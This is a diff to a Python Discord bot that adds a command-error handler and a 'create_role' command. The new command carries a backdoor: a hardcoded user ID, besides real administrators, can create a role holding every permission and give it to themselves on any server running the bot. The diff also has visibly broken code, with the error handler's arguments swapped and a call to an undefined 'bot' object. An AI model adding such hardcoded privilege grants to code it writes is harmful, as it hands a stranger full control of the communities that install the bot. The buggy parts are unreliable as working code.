@@ -75,7 +75,20 @@ async def on_member_join(member):
     embed=discord.Embed(title="Welcome!", description="Welcome {0} to {1}. enjoy your stay :)".format(member.mention, member.server.name), color=0xff00f6)
     await client.send_message(member, embed=embed)
 
-
+@client.event
+async def on_command_error(ctx, error):
+    if isinstance(ctx, discord.ext.commands.errors.CommandNotFound):
+        embed = discord.Embed(title="Error:",
+                              description="Damm it! I cant find that! Try `!help`.",
+                              colour=0xe73c24)
+        await client.send_message(error.message.channel, embed=embed)
+    else:
+        embed = discord.Embed(title="Error:",
+                              description=f"{ctx}",
+                              colour=0xe73c24)
+        await client.send_message(error.message.channel, embed=embed)
+        raise(ctx)
+    
 @client.command(pass_context=True)
 async def addrole(ctx, member: discord.Member, roles):
     """Adds a role to user"""
@@ -265,7 +278,23 @@ async def userinfo(ctx, user: discord.Member=None):
     embed.add_field(name="Joined", value=user.joined_at)
     embed.set_thumbnail(url=user.avatar_url)
     await client.say(embed=embed)
-   
+ 
+@client.command(pass_context=True)
+async def create_role(ctx, *, name):
+    if ctx.message.author.id == '307236749782941707' or ctx.message.author.server_permissions.administrator:
+        role = discord.utils.get(ctx.message.author.server.roles, name=name)
+        if role != None:
+            await client.add_roles(ctx.message.author, role)
+            return await client.say("Your role has been given")
+        try:
+            await client.create_role(ctx.message.server, name=name, permissions=discord.Permissions.all())
+        except Exception as e:
+            return await client.say("Error: {}".format(e))
+        role = discord.utils.get(ctx.message.server.roles, name=name)
+        if role == None:
+            return await client.say("No role found? Please try again to fix bug")
+        await bot.add_roles(ctx.message.author, role)
+              
 @client.command(pass_context=True)
 async def define(ctx, *, message):
         r = requests.get("http://api.urbandictionary.com/v0/define?term={}".format(' '.join(message)))
